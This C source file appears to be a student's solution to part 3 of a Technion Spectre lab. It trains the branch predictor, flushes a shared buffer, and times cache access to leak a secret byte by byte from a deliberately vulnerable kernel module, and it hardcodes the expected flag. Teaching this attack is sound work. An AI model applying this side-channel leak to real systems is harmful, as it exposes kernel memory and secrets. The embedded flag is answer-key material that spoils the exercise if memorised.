/*
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include "labspectre.h"
#include "labspectreipc.h"

static inline void mfence() {
    asm volatile("mfence");
}

/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}
void clean_shared_memory_from_tlb(char *shared_memory) {
    for (size_t i = 0; i < 256; i++)
    {
        clflush(shared_memory + (4096*i));
    }
}


int max_idx(int *hist , int size) {
    int max_id = 0;
    for (int i = 0; i < size; i++) {
        if (hist[i] > hist[max_id]) {
            max_id = i;
        }
    }
    return max_id;
}

void flush_cache() {
    int size = 3*1024;
    int all_cache[size];
    for (int i = 1 ; i < size ; i++)
    {
        all_cache[i] = rand()%25;
    }
    int it = 100 +  rand() % 20;
    int tmp = 0;
    for (int i = 0 ; i < it ; i++) {
        for (int i = 1 ; i < size ; i++)
        {
            mfence();
            all_cache[i] += all_cache[i];
        }
    }
}
/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;
    char sol[] = "Technion{h4rd3st}";

    srand(time(0));
    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        int hist[256] = {0};
        for (int i = 0; i < 50;  i++)
        {
            char leaked_byte;
            int min = 100000;
            for (size_t i = 0; i < 4096 ; i+=(rand()%3 + 1)) //fool BP -in part 2.4 we need to change max(i) //rand max i?
            { 
                mfence();
                call_kernel_part3(kernel_fd, shared_memory, rand() % 2);
            }
            mfence();
            clean_shared_memory_from_tlb(shared_memory);
            flush_cache();
            mfence();
            call_kernel_part3(kernel_fd, shared_memory, current_offset);
            int tmp;
        
            for (int i = 0; i < 256; i++) {
                tmp = time_access(shared_memory + (4096 * i));
                if (tmp < min) {
                    min = tmp;
                    leaked_byte = i;
                }
            }
            hist[leaked_byte]++;
        }
        // [Part 2]- Fill this in!
        // leaked_byte = ??

        leaked_str[current_offset] = max_idx(hist, 256);
        fprintf(stderr, "    %c\t should be %c\n", leaked_str[current_offset], sol[current_offset]);
        if (max_idx(hist , 256) == 0) {//'\0'
            break;
        }
    }

    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
